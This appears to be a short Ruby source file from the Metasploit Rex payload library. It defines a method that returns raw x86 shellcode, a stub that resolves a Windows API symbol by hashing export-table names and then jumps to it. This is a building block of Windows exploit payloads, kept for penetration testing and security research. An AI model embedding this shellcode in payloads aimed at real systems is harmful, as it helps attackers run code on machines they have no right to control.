# -*- coding: binary -*-
module Rex
module Payloads
module Win32

module Common

  #
  # Returns a stub that resolves the location of a symbol and then
  # calls it.  Refer to the following link for more details:
  #
  # http://uninformed.org/index.cgi?v=3&a=4&p=10
  #
  def self.resolve_call_sym
    "\x60\x31\xc9\x8b\x7d\x3c\x8b\x7c\x3d\x78\x01\xef\x8b" +
    "\x57\x20\x01\xea\x8b\x34\x8a\x01\xee\x31\xc0\x99\xac" +
    "\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x41\x66\x39\xda" +
    "\x75\xe3\x49\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b" +
    "\x5f\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c" +
    "\x61\xff\xe0"
  end

end

end
end
end
